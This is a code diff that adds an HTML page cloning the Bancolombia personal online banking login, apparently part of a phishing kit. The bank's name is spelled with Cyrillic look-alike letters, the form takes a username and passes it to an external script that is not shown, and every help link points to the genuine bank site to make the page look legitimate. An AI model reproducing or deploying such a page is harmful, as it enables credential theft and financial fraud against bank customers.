@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ваncоlоmbiа Sucursal Virtal Personas</title>
+    <link rel="icon" href="assets/logos/logo.png">
+
+    <!-- CSS -->
+    <link rel="stylesheet" href="./css/normalize.css">
+    <link rel="stylesheet" href="./css/main.css">
+
+    <!-- FUNCTIONS -->
+    <script src="./js/functions.js"></script>
+</head>
+<body>
+
+    <header>
+        <img class="header-logo" src="./assets/logos/logo.svg" alt="">
+        <h3 class="header-subtitle">Sucursal Virtual Personas</h3>
+        <p class="header-text-info">Fecha y hora actual: <span id="datetime"></span></p>
+    </header>
+
+    <main>
+        <div class="page-label">
+            <h3 class="page-label-title">Inicio de sesión</h3>
+        </div>
+
+        <div class="error d-none mt-2">
+            <img src="./assets/icons/error.jpg">
+            <div class="error--text">
+                <h3>Error</h3>
+                <h4>Usuario o clave inválida. Por favor intente de nuevo.</h4>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-header">
+                <h3>Usuario</h3>
+            </div>
+            <div class="card-message">
+                <p>Si no tienes un usuario asignado ingresa con tu documento de identidad</p>
+            </div>
+
+            <!-- FORM AND INPUTS -->
+            <form id="form">
+                <div class="form-label">
+                    <img class="icon-info" src="./assets/icons/info.jpg" alt=""><label for="">Ingresa tu usuario</label>
+                </div>
+
+                <input class="form-input-text icon-i-user" type="text" required id="user">
+                
+                <div class="one-btn-container">
+                    <button class="btn mt-4">
+                        Continuar
+                    </button>
+                </div>
+                
+                <div class="login-options">
+                    <a target="_blank" href="https://sucursalpersonas.transaccionesbancolombia.com/">¿Olvidaste tu usuario?</a>
+                    <a target="_blank" href="https://sucursalpersonas.transaccionesbancolombia.com/">¿Problemas para conectarte?</a>
+                </div>
+            </form>
+        </div>
+
+        <div class="card card-info">
+            <div>
+                <img src="./assets/icons/demo.jpg" width="20px">
+                <a target="_blank" href="https://sucursalpersonas.transaccionesbancolombia.com/">Conoce sobre Sucursal Virtual Personas</a>
+            </div>
+            <div>
+                <img src="./assets/icons/seguridad.jpg" width="20px">
+                <a target="_blank" href="https://sucursalpersonas.transaccionesbancolombia.com/">Aprende sobre Seguridad</a>
+            </div>
+            <div>
+                <img src="./assets/icons/reglamento.jpg" width="20px">
+                <a target="_blank" href="https://sucursalpersonas.transaccionesbancolombia.com/">Reglamento Sucursal Virtual</a>
+            </div>
+            <div>
+                <img src="./assets/icons/politica.jpg" width="20px">
+                <a target="_blank" href="https://sucursalpersonas.transaccionesbancolombia.com/">Política de Privacidad</a>
+            </div>
+            
+        </div>
+
+        <div class="header-publicity">
+            <img src="./assets/header_publicidad_2.png" alt="">
+            <p>¿No conoces la Sucursal Virtual Personas de Ваncоlоmbiа? Conoce más aquí</p>
+        </div>
+
+        <footer class="footer-telephones">
+            <div class="tels">
+                Sucursal Telefónica Ваncоlоmbiа: Bogotá (57) 60 1 343 00 00 - Medellín (57) 60 4 510
+				90 00 - Cali (57) 60 2 554 05 05 - Barranquilla (57) 60 5 361 88 88 - Cartagena (57) 60 5 693 44 00 -
+				Bucaramanga (57) 60 7 697 25 25 - Pereira (57) 60 6 340 12 13 - El resto del país 018000 9 12345.
+				Sucursales Telefónicas en el exterior: España (34) 900 995 717 - Estados Unidos (1) 866 379 97 14.</div>
+			<div class="footer-ip">
+				<span>Dirección IP: <span id="ip">186.192.168.249</span></span>
+				<span>Copyright © 2023 Ваncоlоmbiа S.A.</span>
+			</div>
+        </footer>
+    </main>
+    
+
+
+
+
+
+    <!-- JS -->
+    <script src="./js/index.js"></script>
+</body>
+</html>
